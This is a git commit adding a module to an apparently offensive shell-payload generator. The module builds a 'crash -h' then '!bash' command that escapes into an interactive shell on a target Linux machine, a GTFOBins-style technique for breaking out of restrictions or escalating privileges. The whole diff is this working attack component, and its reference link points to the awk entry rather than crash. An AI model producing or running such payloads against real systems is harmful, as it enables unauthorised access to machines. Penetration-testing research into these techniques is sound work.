5ab378d5cebc794027cdf04b8387145978fe1e15
Nong Hoang Tu <dmknght@parrotsec.org>
2021-10-23 01:30:15 +0700

    add crash

---
+++ shellgen/modules/linux/crash.py
@@ -0,0 +1,19 @@
+from ogabog.cores import plugin, const
+
+
+class Shell(plugin.BaseShell):
+    def __init__(self):
+        super().__init__()
+        self.shell_type = 0
+        self.is_interactive = True
+        self.add_args(
+            "--shell",
+            default="bash",
+            choices=const.LINUX_SHELL,
+            help="Select shell type on target machine"
+        )
+        self.opts.description = "https://gtfobins.github.io/gtfobins/awk/"
+        self.opts.description += "\nModule author: Nong Hoang Tu <dmknght@parrotsec.org>"
+
+    def make_shell(self):
+        self.shell = f"crash -h\n!\"{self.args.shell}"
